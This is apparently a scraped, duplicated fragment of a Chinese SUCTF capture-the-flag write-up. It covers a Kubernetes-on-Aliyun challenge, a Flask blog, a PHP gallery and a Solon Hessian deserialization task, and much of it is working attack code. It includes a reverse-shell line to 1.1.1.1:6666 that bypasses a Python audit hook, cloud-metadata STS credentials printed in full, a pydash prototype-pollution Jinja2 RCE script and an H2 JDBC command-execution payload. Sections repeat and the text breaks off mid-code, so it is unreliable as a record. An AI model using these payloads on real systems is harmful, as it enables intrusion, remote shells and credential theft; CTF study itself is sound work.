Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index 